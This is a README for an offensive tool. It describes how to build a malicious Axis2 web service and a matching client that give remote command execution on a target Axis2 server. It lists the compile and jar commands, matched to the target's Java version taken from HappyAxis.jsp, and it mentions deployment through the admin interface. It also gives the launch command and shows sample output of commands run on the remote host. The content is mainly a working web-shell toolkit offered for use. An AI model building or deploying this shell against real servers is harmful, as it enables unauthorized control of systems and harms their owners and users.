# Axis2 RPC Shell

This package contains a deployable Axis2 web service along with a bootstrapped shell that can be used to obtain remote command execution on an Axis2 server.  This was produced for two reasons: I wanted a simple shell that could be deployed manually, and I did not want to use Metasploit.  Communication between the Axis2 server and shell are over RPC, and is base64'd (feel free to PR crypto support).  Think Java applets.  This is not a full featured shell (like Fuze), but allows simple, ad-hoc command execution on a remote Axis2 server.

Tested on Linux and Windows, back to 1.3, with Java versions 1.6 and 1.7.  Packaged Axis2 libraries taken from 1.3, but have been tested and working with 1.6.3 (latest) builds.

# Build

BUILDING THIS FOR YOUR ENVIRONMENT IS GOING TO BE DIFFERENT ALMOST EVERY TIME.  READ THIS STUFF.

With your target box in sights, navigate to `http://your-host:8080/axis2/axis2-web/HappyAxis.jsp` to obtain the local Java version.  This is required for correctly building the web service.

We can then put our web service together with the following:

```
javac -target [VERSION] -source [VERSION] -cp .:"lib/*" helper/HelpService.java
jar cf helper.jar helper/* META-INF/*
```

Replace VERSION with the major/minor Java version discovered on the remote host (ie. 1.6/1.7/1.8).  This will produce `helper.jar`, which is the Axis2 web service ready to be deployed.  You can deploy this via the web interface or using my app server tool `clusterd`.

We then need to build our shell component, which can be built using the same method:

```
javac -cp .:"lib/*" rpcshell.java
```

# Usage

Once you've got your shiny service deployed, we just need to fire up the shell.  This can be performed using the following, passing in the IP and PORT of the remote Axis2 server:

```
java -cp .:"lib/*" rpcshell 127.0.0.1 8080
```

Which launches this:

```
[!] Type !exit to quit
localhost > id -a

uid=1000(bryan) gid=1000(bryan) groups=1000(bryan),4(adm),20(dialout),24(cdrom),46(plugdev),116(lpadmin),118(admin),124(sambashare)
localhost > 
```

Shell works as advertised.
